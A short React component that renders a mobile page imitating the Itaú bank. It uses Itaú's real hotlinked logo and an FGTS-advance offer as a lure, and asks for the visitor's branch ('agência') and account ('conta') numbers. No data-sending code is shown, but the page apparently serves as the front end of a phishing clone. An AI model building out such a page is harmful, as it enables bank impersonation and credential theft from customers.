import React from 'react'
import './FisicaMobile.css'

const FisicaMobile = () => {
  return (
    <div className='FisicaMobile'>
        <div className='logo'>
            <img src="https://www.itau.com.br/media/dam/m/538533fcf33fd411/original/itau-logo-branco-48x48.png" alt="logo_itau" />
        </div>
        <div className='title1'>
            <span>Não deixe o seu<br />dinheiro parado</span>
            <p>Antecipe o seu FGTS em até<br />7 parcelas e o dinheiro cai<br/>em até 24 horas.</p>
        </div>
        <div className='form1'>
            <input className='digitavel' type="text" placeholder='agência' />
            <input className='digitavel' type="text" placeholder='conta' /><br /><br />
            <input type="checkbox" /><label>lembrar de mim</label><br /><br /><br />
            <button>próximo</button>
        </div>
    </div>
  )
}

export default FisicaMobile